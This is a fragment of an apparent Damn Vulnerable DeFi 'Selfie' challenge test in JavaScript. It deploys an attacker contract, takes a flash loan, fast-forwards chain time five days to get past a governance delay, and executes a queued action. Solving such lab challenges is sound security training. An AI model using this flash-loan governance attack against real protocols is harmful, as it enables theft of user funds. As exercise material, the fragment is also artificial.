...
describe("[Challenge] Selfie", function () {
  ...
  const ONE_ETHER = ethers.utils.parseEther("1"); // 1.5 million tokens
  ...
  it("Exploit", async function () {
    ...
    const AttackSelfiePool = await ethers.getContractFactory("AttackSelfiePool", attacker);

    this.attackSelfiePool = await AttackSelfiePool.deploy(
      this.pool.address,
    ...
    //   to: this.attackSelfiePool.address,
    //   value: ONE_ETHER,
    //   gasLimit: "30000000",
    // });

    await this.attackSelfiePool.executeFlashLoan();

    // Advance time 5 days to bypass acion delay.
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    await this.attackSelfiePool.executeAction();
  });
